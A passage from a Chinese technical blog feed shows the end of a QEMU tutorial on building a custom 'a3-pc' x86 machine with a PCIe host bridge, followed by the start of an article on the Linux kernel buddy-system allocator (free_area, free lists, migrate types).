class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;exec/memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-properties.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pci.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pcie_host.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci-host/a3pc.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/error-report.h&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_host_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// nothing to do</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_set_irq</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, <span class="hljs-type">int</span> irq_num, <span class="hljs-type">int</span> level)</span><br>&#123;<br>    warn_report(<span class="hljs-string">&quot;A3-PC: not support INTx (irq %d, level %d)&quot;</span>,<br>                irq_num, level);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3_pc_pcie_swizzle_map_irq_fn</span><span class="hljs-params">(PCIDevice *pci_dev, <span class="hljs-type">int</span> pin)</span><br>&#123;<br>    warn_report(<span class="hljs-string">&quot;A3-PC: not support INTx (pin %d)&quot;</span>, pin);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_host_realize</span><span class="hljs-params">(DeviceState *dev, Error **errp)</span><br>&#123;<br>    PCIHostState *pci = PCI_HOST_BRIDGE(dev);<br>    A3PCPCIEHost *h = A3_PC_PCIE_HOST(dev);<br>    SysBusDevice *sbd = SYS_BUS_DEVICE(dev);<br><br>    memory_region_init(&amp;h-&gt;mem, OBJECT(h), <span class="hljs-string">&quot;a3-pc-mem&quot;</span>, <span class="hljs-number">16</span>);<br>    memory_region_init(&amp;h-&gt;io, OBJECT(h), <span class="hljs-string">&quot;a3-pc-io&quot;</span>, <span class="hljs-number">16</span>);<br>    sysbus_init_mmio(sbd, &amp;h-&gt;mem);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * A PCIe host in QEMU is required to provide</span><br><span class="hljs-comment">     * a pair of callbacks: set_irq() and map_irq()</span><br><span class="hljs-comment">     */</span><br>    pci-&gt;bus = pci_register_root_bus(dev, <span class="hljs-string">&quot;a3-pcie0&quot;</span>,<br>                                    a3_pc_pcie_set_irq,<br>                                    a3_pc_pcie_swizzle_map_irq_fn,<br>                                    h, &amp;h-&gt;mem, &amp;h-&gt;io, <br>                                    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, TYPE_PCIE_BUS);<br>&#125;<br><br><span class="hljs-type">static</span> Property a3_pc_pcie_host_props[] = &#123;<br>    DEFINE_PROP_END_OF_LIST(),<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br><br>    dc-&gt;realize = a3_pc_pcie_host_realize;<br>    set_bit(DEVICE_CATEGORY_BRIDGE, dc-&gt;categories);<br>    device_class_set_props(dc, a3_pc_pcie_host_props);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_pcie_host = &#123;<br>    .name = TYPE_A3_PC_PCIE_HOST,<br>    .parent = TYPE_PCI_HOST_BRIDGE,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCPCIEHost),<br>    .instance_init = a3_pc_host_init,<br>    .class_init = a3_pc_class_init,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_host_register</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register(&amp;a3_pc_pcie_host);<br>&#125;<br><br>type_init(a3_pc_pcie_host_register);<br></code></pre></td></tr></table></figure><blockquote><p>ä¿®æ”¹æ–‡ä»¶ï¼šhw/pci-host/meson.build</p><blockquote><p>è€ç‰ˆæœ¬æ²¡æµ‹äº†ï¼Œè‡ªå·±æƒ³è¯¥æ€ä¹ˆæ”¹å§ï¼ˆç¬‘ï¼‰</p></blockquote></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs meson"># A3 devices<br>pci_ss.add(when: &#x27;CONFIG_PCI&#x27;, if_true: files(&#x27;a3pc.c&#x27;))<br></code></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬åœ¨æˆ‘ä»¬çš„æœºå™¨ç±»å‹ä¸­åŠ ä¸Š PCI ç›¸å…³çš„ä¸¤ä¸ªæŒ‡é’ˆæˆå‘˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineState parent;<br><br>    <span class="hljs-comment">/* &lt;public&gt; */</span><br><br>    <span class="hljs-comment">/* State for other subsystems/APIs: */</span><br>    Notifier machine_done;<br><br>    <span class="hljs-comment">/* Pointers to devices and objects: */</span><br>    PCIBus *bus;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * QEMU requires the entire PCI(e) hierarchy be attached to</span><br><span class="hljs-comment">     * a PCI(e) bus, so BES-VNC machine has to implement one.</span><br><span class="hljs-comment">     */</span><br>    PCIHostState *pci;<br>&#125; A3PCMachineState;<br></code></pre></td></tr></table></figure><p>æœ€ååœ¨æœºå™¨åˆå§‹åŒ–å‡½æ•°ä¸­åˆå§‹åŒ–ä¸€ä¸ªæˆ‘ä»¬è‡ªå®šä¹‰çš„è¿™ä¸ª PCIe è®¾å¤‡å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br>    DeviceState *dev = qdev_new(TYPE_A3_PC_PCIE_HOST);<br><br>    sysbus_realize_and_unref(SYS_BUS_DEVICE(dev), &amp;error_fatal);<br>    ms-&gt;pci = PCI_HOST_BRIDGE(dev);<br><br>    memory_region_add_subregion(get_system_memory(), <span class="hljs-number">0</span>,<br>                                sysbus_mmio_get_region(SYS_BUS_DEVICE(dev), <span class="hljs-number">0</span>));<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„æ–°ç‰ˆæœ¬å’Œè€ç‰ˆæœ¬çš„ API ä¸åŒï¼Œåœ¨è€ç‰ˆæœ¬ä¸­åº”å½“ä½¿ç”¨å¦‚ä¸‹ APIï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br><br>    DeviceState *dev = qdev_create(<span class="hljs-literal">NULL</span>, TYPE_A3_PC_PCIE_HOST);<br><br>    qdev_init_nofail(dev);<br>    ms-&gt;pci = PCI_HOST_BRIDGE(dev);<br><br>    memory_region_add_subregion(get_system_memory(), <span class="hljs-number">0</span>,<br>                                sysbus_mmio_get_region(SYS_BUS_DEVICE(dev), <span class="hljs-number">0</span>));<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br></code></pre></td></tr></table></figure><p>å®Œæˆè¿™äº›æ­¥éª¤ä¹‹åæˆ‘ä»¬çš„æ–°æœºå™¨å°±èƒ½éšæ„æ’å…¥å„ç§ PCI è®¾å¤‡äº†ï¼›ï¼‰</p><h3 id="IIã€æ·»åŠ æ–°çš„-CPU-æ’æ§½ğŸ•Š">IIã€æ·»åŠ æ–°çš„ CPU æ’æ§½ğŸ•Š</h3><p>å½“ç„¶ï¼Œæˆ‘ä»¬çš„æœºå™¨è¿˜ç¼ºå°‘äº† CPUï¼Œæ²¡æœ‰ CPU çš„æœºå™¨è‡ªç„¶æ˜¯è·‘ä¸èµ·æ¥çš„ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨æˆ‘ä»¬çš„æœºå™¨ç±»å‹å½“ä¸­æ·»åŠ ä¸Šç›¸åº”çš„ CPU æ’æ§½ï¼Œç”±äº Qemu å†…éƒ¨çš„åŸºç¡€ x86 æœºå™¨æ¶æ„å·²ç»å®ç°å¥½äº†åŸºç¡€æ¡†æ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ”¹ä¸ºç»§æ‰¿è‡ªå¯¹åº”çš„ x86 åŸºç¡€æœºå™¨ç±»å³å¯</p><blockquote><p>å½“ç„¶ï¼Œå¦‚æœæ˜¯çº¯çº¯è‡ªå®šä¹‰çš„å¼‚æ¶æ„ï¼Œè¿™é‡Œè¿˜æ˜¯å¾—è‡ªå·±æ‰‹åŠ¨å†™ä¸€å¥—â€¦</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    X86MachineState parent;<br><br>    <span class="hljs-comment">/* &lt;public&gt; */</span><br><br>    <span class="hljs-comment">/* State for other subsystems/APIs: */</span><br>    Notifier machine_done;<br><br>    <span class="hljs-comment">/* Pointers to devices and objects: */</span><br>    PCIBus *bus;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * QEMU requires the entire PCI(e) hierarchy be attached to</span><br><span class="hljs-comment">     * a PCI(e) bus, so BES-VNC machine has to implement one.</span><br><span class="hljs-comment">     */</span><br>    PCIHostState *pci;<br>&#125; A3PCMachineState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    X86MachineClass parent;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br><br>    <span class="hljs-comment">/* Default CPU model version.  See x86_cpu_set_default_version(). */</span><br>    <span class="hljs-type">int</span> default_cpu_version;<br>&#125; A3PCMachineClass;<br></code></pre></td></tr></table></figure><p>ä¸è¿‡æœºå™¨å®šä¹‰çš„æ–‡ä»¶å½“ä¸­éœ€è¦æ”¹åŠ¨çš„éƒ¨åˆ†ä¼šæ¯”é¢„æƒ³çš„è¦å¤šï¼Œ<s>æ‰€ä»¥è¿™é‡Œå°±å…ˆğŸ•ŠğŸ•ŠğŸ•Šäº†</s></p><h3 id="Extra-è‡ªå®šä¹‰-CPU-ğŸ•Š">Extra.è‡ªå®šä¹‰ CPU ğŸ•Š</h3><blockquote><p>ğŸ•ŠğŸ•ŠğŸ•Š</p></blockquote><h2 id="å››ã€ç¼–è¯‘è¿è¡ŒğŸ•Š">å››ã€ç¼–è¯‘è¿è¡ŒğŸ•Š</h2><p>ç”±äºæˆ‘ä»¬æ–°å»ºç«‹çš„æœºå™¨ç±»å‹ä¸º <code>x86</code> æ¶æ„çš„æœºå™¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨æ‰§è¡Œ configure è„šæœ¬æ—¶æŒ‡å®š <code>--target-list=x86_64-softmmu</code></p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å‰å‰é¢ç¬”è€…æä¾›äº†ä¸¤ç§è®¾ç½® <code>CONFIG_A3_PC</code> çš„é€‰é¡¹ï¼šå¦‚æœæˆ‘ä»¬æ˜¯ç›´æ¥é€šè¿‡ä¿®æ”¹ <code>default.mak</code> ä½¿å¾— <code>CONFIG_A3_PC=y</code>ï¼Œåˆ™ç›´æ¥ç¼–è¯‘å³å¯ï¼›è‹¥æˆ‘ä»¬æ˜¯é€šè¿‡ä¿®æ”¹äº† <code>configure</code> æ¥æŒ‡å®š <code>CONFIG_A3_PC</code> çš„å€¼ï¼Œåˆ™åˆ›å»ºç¼–è¯‘è„šæœ¬çš„æ—¶å€™æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æŒ‡å®š <code>--enable-a3-pc</code> æ¥ç¼–è¯‘ä¸Šæˆ‘ä»¬æ–°å¢çš„æœºå™¨ç±»å‹</p><p>ç¼–è¯‘å®Œæˆåæˆ‘ä»¬ä¾¿èƒ½å¤Ÿçœ‹åˆ°æˆ‘ä»¬æ–°æ·»åŠ çš„æœºå™¨ç±»å‹ <code>a3-pc</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">./qemu-system-x86_64 -machine ?</span><br>Supported machines are:<br>microvm              microvm (i386)<br>pc                   Standard PC (i440FX + PIIX, 1996) (alias of pc-i440fx-7.0)<br>pc-i440fx-7.0        Standard PC (i440FX + PIIX, 1996) (default)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">...</span><br>a3-pc                (null)<br></code></pre></td></tr></table></figure><blockquote><p>ğŸ•ŠğŸ•ŠğŸ•Š</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸å¦‚ VMWareğŸ‘‹&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="PCI" scheme="http://blog.arttnba3.cn/tags/PCI/"/>
    
    <category term="è™šæ‹ŸåŒ–" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Qemu" scheme="http://blog.arttnba3.cn/tags/Qemu/"/>
    
  </entry>
  
  <entry>
    <title>ã€OS.0x03ã€‘Linuxå†…æ ¸å†…å­˜ç®¡ç†II - Buddy System</title>
    <link href="http://blog.arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/"/>
    <id>http://blog.arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/</id>
    <published>2022-06-30T15:44:49.000Z</published>
    <updated>2023-01-20T04:58:47.801Z</updated>
    
    <content type="html"><![CDATA[<p>HEY DUDE!</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>åœ¨<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/">ä¸Šä¸€ç¯‡æ–‡ç« </a>ä¸­ç¬”è€…ç®€è¦é˜è¿°äº† Linux å†…æ ¸å½“ä¸­å†…å­˜çš„åŸºæœ¬ç»„ç»‡æ¶æ„ï¼šé¡µã€åŒºã€èŠ‚ç‚¹ï¼Œåœ¨æœ¬ç¯‡æ–‡ç« å½“ä¸­ç¬”è€…å°†é˜è¿°å†…æ ¸ä¸­æœ€<strong>åŸºç¡€</strong>çš„å†…å­˜åˆ†é…å™¨â€”â€”<strong>Buddy Systen</strong>ï¼ˆä¼™ä¼´ç³»ç»Ÿï¼‰</p><blockquote><p>é€šè¿‡è¯»å– <code>/proc/buddyinfo</code> å¯ä»¥è·å–å½“å‰ç³»ç»Ÿä¸­ buddy system çš„è¯¦ç»†ä¿¡æ¯</p><p><img src="https://i.loli.net/2021/11/30/eRiVXpyUkncYZus.png" alt="image.png"></p><blockquote><p>ç¬”è€…çš„ğŸ’»é…ç½®æ¯”è¾ƒğŸš®ï¼Œæ‰€ä»¥åªæœ‰ä¸€ä¸ª nodeï¼Œéå¸¸æŠ±æ­‰â€¦</p></blockquote></blockquote><blockquote><p>è¿™ç¯‡æ–‡ç« å…¶å®å¾ˆæ—©å°±å†™äº†ä¸ªæ¡†æ¶äº†ï¼Œä½†æ˜¯åé¢ä¸€ç›´æ²¡æœ‰æ¥å¾—åŠè¿›è¡Œè¡¥å®Œâ€¦ï¼ˆå…¶å®å°±æ˜¯æ‡’è€Œå·²å§ï¼ˆæ¼ï¼‰ï¼‰</p><p><img src="https://s2.loli.net/2022/06/08/7VaQ6riZOcmDuEg.png" alt="image.png"></p></blockquote><h1>0x01.buddy system ä¸­çš„å†…å­˜ç»„ç»‡å½¢å¼</h1><h2 id="zone-ä¸­çš„-free-area-ç»“æ„ä½“æ•°ç»„">zone ä¸­çš„ free_area ç»“æ„ä½“æ•°ç»„</h2><p>å‰æ–‡ä¸­æˆ‘ä»¬è®²åˆ°ï¼Œæ¯ä¸ª zone ç»“æ„ä½“ä¸­éƒ½æœ‰ä¸€ä¸ª free_area ç»“æ„ä½“æ•°ç»„ï¼Œç”¨ä»¥å­˜å‚¨ buddy system <strong>æŒ‰ç…§ order ç®¡ç†çš„é¡µé¢</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> &#123;</span><br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span><span class="hljs-title">free_area</span>[<span class="hljs-title">MAX_ORDER</span>];</span><br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­çš„ <code>MAX_ORDER</code> ä¸ºä¸€ä¸ªå¸¸é‡ï¼Œå€¼ä¸º 11</p><p>åœ¨ buddy system ä¸­æŒ‰ç…§ç©ºé—²é¡µé¢çš„è¿ç»­å¤§å°è¿›è¡Œåˆ†é˜¶ç®¡ç†ï¼Œè¿™é‡Œçš„ order çš„å®é™…å«ä¹‰ä¸º<strong>è¿ç»­çš„ç©ºé—²é¡µé¢çš„å¤§å°</strong>ï¼Œä¸è¿‡å•ä½ä¸æ˜¯é¡µé¢æ•°ï¼Œè€Œæ˜¯<code>é˜¶</code>ï¼Œå³å¯¹äºæ¯ä¸ªä¸‹æ ‡è€Œè¨€ï¼Œå…¶ä¸­æ‰€å­˜å‚¨çš„é¡µé¢å¤§å°ä¸ºï¼š<br>$$<br>2^{order}<br>$$<br>åœ¨ free_area ä¸­å­˜æ”¾çš„é¡µé¢é€šè¿‡è‡ªèº«çš„ç›¸åº”å­—æ®µè¿æ¥æˆåŒå‘é“¾è¡¨ç»“æ„ï¼Œç”±æ­¤æˆ‘ä»¬å¾—åˆ°è¿™æ ·ä¸€å¼ _Overview_ï¼š</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><p>ä¸‹é¢æˆ‘ä»¬æ¥è§£æ <code>free_area</code> çš„å…·ä½“ç»“æ„ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">free_list</span>[<span class="hljs-title">MIGRATE_TYPES</span>];</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>nr_free;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="free-listï¼šç©ºé—²é¡µé¢åŒå‘é“¾è¡¨">free_listï¼šç©ºé—²é¡µé¢åŒå‘é“¾è¡¨</h3><p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºï¼šfree_area çš„ free_list å­—æ®µä¾¿æ˜¯ç”¨ä»¥å­˜æ”¾æŒ‡å‘ç©ºé—²é¡µé¢çš„æŒ‡é’ˆï¼Œå…¶é€šè¿‡ page ç»“æ„ä½“çš„ <code>lru</code> å­—æ®µå°† page ç»“æ„ä½“è¿æ¥æˆåŒå‘é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> &#123;</span><br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><span class="hljs-comment">/* é¡µç¼“å­˜ä¸åŒ¿åé¡µ */</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @lru: Pageout é“¾è¡¨, ä¾‹å¦‚ active_list ä¾¿ç”±</span><br><span class="hljs-comment"> * lruvec-&gt;lru_lock ä¿æŠ¤ã€‚  </span><br><span class="hljs-comment"> * æœ‰æ—¶ä¼šè¢«é¡µæ‰€æœ‰è€…ä½œä¸ºå¸¸è§„é“¾è¡¨ä½¿ç”¨ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">lru</span>;</span><br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>page ç»“æ„ä½“ä¸­çš„ <code>lru</code> è¿™ä¸€å­—æ®µçš„ç±»å‹ä¸º <code>struct list_head</code>ï¼Œè¿™æ˜¯å†…æ ¸ç¼–ç¨‹ä¸­é€šç”¨çš„åŒå‘é“¾è¡¨ç»“æ„ï¼Œ<strong>free_list ä¸ lru é“¾è¡¨éƒ½ä½¿ç”¨è¯¥å­—æ®µ</strong> å°†é¡µç»“æ„ä½“ç»„ç»‡ä¸º_åŒå‘é“¾è¡¨_ï¼Œå³_ä¸€ä¸ªé¡µæ˜¯ä¸å¯èƒ½åŒæ—¶å‡ºç°åœ¨ lru é“¾è¡¨ä¸ buddy system ä¸­çš„_</p><h4 id="è¿ç§»ç±»å‹åˆ†é“¾è¡¨"><em>è¿ç§»ç±»å‹åˆ†é“¾è¡¨</em></h4><p>åœ¨è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°free_area ä¸­<strong>å¹¶éåªæœ‰ä¸€ä¸ªåŒå‘é“¾è¡¨</strong>ï¼Œè€Œæ˜¯æŒ‰ç…§ä¸åŒçš„â€œè¿ç§»ç±»å‹â€ï¼ˆmigrate typeï¼‰è¿›è¡Œåˆ†å¼€å­˜æ”¾ï¼Œè¿™æ˜¯ç”±äº_é¡µé¢è¿ç§»_æœºåˆ¶çš„å­˜åœ¨</p><p>é¡µé¢è¿ç§»ä¸»è¦ç”¨ä»¥è§£å†³å†…æ ¸ç©ºé—´ä¸­çš„<strong>ç¢ç‰‡é—®é¢˜</strong>ï¼Œåœ¨é•¿æœŸçš„è¿è¡Œä¹‹åå†…å­˜å½“ä¸­ç©ºé—²é¡µé¢çš„åˆ†å¸ƒå¯èƒ½æ˜¯é›¶æ•£çš„ï¼Œè¿™ä¾¿å¯¼è‡´äº†å†…æ ¸<strong>æœ‰å¯èƒ½æ— æ³•æ˜ å°„åˆ°è¶³å¤Ÿå¤§çš„è¿ç»­å†…å­˜</strong>ï¼Œå› æ­¤éœ€è¦è¿›è¡Œ_é¡µé¢è¿ç§»_â€”â€”å°†æ—§çš„é¡µé¢è¿ç§»åˆ°æ–°çš„ä½ç½®</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="ä»çŸ¥ä¹å·çš„å›¾.png"></p><p>ä½†<strong>å¹¶éæ‰€æœ‰çš„é¡µé¢éƒ½æ˜¯èƒ½å¤Ÿéšæ„è¿ç§»çš„</strong>ï¼Œå› æ­¤æˆ‘ä»¬åœ¨ buddy system å½“ä¸­è¿˜éœ€è¦å°†é¡µé¢æŒ‰ç…§è¿ç§»ç±»å‹è¿›è¡Œåˆ†ç±»</p><p>è¿ç§»ç±»å‹ç”±ä¸€ä¸ªæšä¸¾ç±»å‹å®šä¹‰ï¼Œå®šä¹‰äº <code>/include/linux/mmzone.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">migratetype</span> &#123;</span><br>MIGRATE_UNMOVABLE,<br>MIGRATE_MOVABLE,<br>MIGRATE_RECLAIMABLE,<br>MIGRATE_PCPTYPES,<span class="hljs-comment">/* the number of types on the pcp lists */</span><br>MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CMA</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * MIGRATE_CMA migration type is designed to mimic the way</span><br><span class="hljs-comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span><br><span class="hljs-comment"> * from MIGRATE_CMA pageblocks and page allocator never</span><br><span class="hljs-comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The way to use it is to change migratetype of a range of</span><br><span class="hljs-comment"> * pageblocks to MIGRATE_CMA which can be done by</span><br><span class="hljs-comment"> * __free_pageblock_cma() function.  What is important though</span><br><span class="hljs-comment"> * is that a range of pageblocks must be aligned to</span><br><span class="hljs-comment"> * MAX_ORDER_NR_PAGES should biggest page be bigger then</span><br><span class="hljs-comment"> * a single pageblock.</span><br><span class="hljs-comment"> */</span><br>MIGRATE_CMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> 